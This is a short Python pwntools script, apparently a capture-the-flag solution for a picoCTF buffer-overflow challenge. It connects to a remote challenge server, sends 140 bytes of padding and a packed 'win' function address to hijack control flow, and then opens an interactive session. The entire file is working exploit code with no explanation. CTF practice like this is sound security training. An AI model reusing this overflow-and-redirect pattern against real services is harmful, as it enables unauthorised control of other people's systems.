from pwn import *
context.clear(arch='amd64', os='windows')

win_addr = 0x401530
#exit_addr = 0x406190
#vuln_addr = 0x4015a9
p = remote('saturn.picoctf.net', 12345)
p.send(b"A" * 140)
p.send(p32(win_addr))
p.send(b'\n')
print(p.recvline())
print(p.recvline())
p.interactive()
